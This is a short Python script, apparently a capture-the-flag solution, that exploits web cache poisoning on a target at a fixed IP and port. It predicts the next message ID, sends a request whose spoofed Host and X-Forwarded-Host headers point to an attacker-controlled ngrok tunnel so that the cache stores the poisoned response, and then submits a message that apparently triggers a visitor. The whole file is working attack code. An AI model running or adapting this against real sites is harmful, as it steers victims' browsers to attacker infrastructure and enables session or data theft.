import requests

web = 'http://94.237.62.195:54599'  
ngrok = '5ec1-180-243-4-148.ngrok-free.app' 

def get_id():
    # If ID goes over, it should end at the last ID
    # Take the count variable for ID
    url = f'{web}/message/100'
    response = requests.get(url)
    return response.json().get('count')


def cache_poison():
    current_id = get_id()
    next_id = current_id + 1
    url_cache = f'{web}/letters?id={next_id}'
    headers = {
        "Host": "127.0.0.1",
        "X-Forwarded-Host": ngrok,
    }
    print(headers)
    response = requests.get(url=url_cache, headers=headers)
    print(response.text)
    if headers['X-Forwarded-Host'] in response.text:
        print(f'Cached at {next_id}')

def submit():
    url_last = f'{web}/submit'
    data = {
        "message": "lmao"
    }
    response = requests.post(url_last, json=data)
    return response

cache_poison()
submit()
